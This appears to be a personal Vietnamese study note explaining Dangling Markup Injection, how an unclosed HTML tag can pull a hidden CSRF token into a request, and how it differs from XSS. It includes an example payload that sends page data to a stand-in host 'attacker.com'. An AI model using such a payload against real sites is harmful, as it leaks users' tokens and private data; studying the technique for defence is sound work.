### lý thuyết 
-**Dangling Markup Injection** là html injection, chèn vào đoạn html chưa đóng ">" để làm lộ mấy thằng html bị ẩn đằng sau.
<u>-Ví dụ, </u>trang web có:
```html
<h1>Welcome, USER_INPUT</h1>

<input type="hidden" name="csrf" value="SECRET_TOKEN">
```
Bạn nhập:
```html
"><img src="https://attacker.com/log?
```
Response có thể trở thành:
```html
<h1>Welcome, "><img src="https://attacker.com/log?</h1>

<input type="hidden" name="csrf" value="SECRET_TOKEN">
```
Ở đây, attacker đã chèn:
```html
<img src="https://attacker.com/log?
```
Nhưng phần `src="...` chưa được đóng. Vì vậy trình duyệt có thể tiếp tục đọc nội dung phía sau như một phần của giá trị đó. Ý tưởng là dữ liệu phía sau, chẳng hạn CSRF token hoặc thông tin nhạy cảm, có thể bị kéo vào markup và gửi đến máy chủ của attacker.

<u>-Điểm khác với XSS là:</u>
**XSS:**
```text
Input → JavaScript → thực thi code → đánh cắp dữ liệu
```
**Dangling Markup:**
```text
Input → HTML chưa đóng → trình duyệt tiếp tục parse dữ liệu phía sau → làm lộ dữ liệu
```
Vì vậy, Dangling Markup thường được dùng trong tình huống:
> **Có khả năng HTML Injection, nhưng không thể thực thi JavaScript do bộ lọc hoặc CSP.**

>*đ hiểu cái lz j cả, tao cần ví dụ mới hiểu nổi*

>*Đại khái nó là html injection*
>-và nó chèn html chưa hoàn chỉnh --> giúp lộ mấy thằng  đằng sau ra